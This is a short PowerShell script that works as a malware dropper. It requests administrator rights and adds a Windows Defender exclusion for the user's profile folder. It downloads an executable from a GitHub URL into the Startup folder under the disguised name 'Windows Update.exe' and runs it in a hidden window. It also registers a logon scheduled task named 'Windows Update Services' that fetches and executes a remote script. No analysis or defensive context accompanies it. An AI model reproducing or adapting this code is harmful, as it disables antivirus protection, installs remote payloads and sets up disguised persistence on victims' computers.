$userDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$fileUrl = "https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/updater.exe"
$startupFilePath = "$userDirectory\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update.exe"
$downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startupFilePath'"
$exclusionCommand = "Add-MpPreference -ExclusionPath '$userDirectory'"
$startupCommand = "Start-Process '$startupFilePath'"
Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($exclusionCommand); `$($downloadCommand); `$($startupCommand)"
$Action = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w hidden "iex(iwr https://raw.githubusercontent.com/MRvinyKing/pythonwgetfilestest/main/i.ps1 -UseB)"'
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "Windows Update Services" -Action $Action -Trigger $Trigger -Settings $Settings
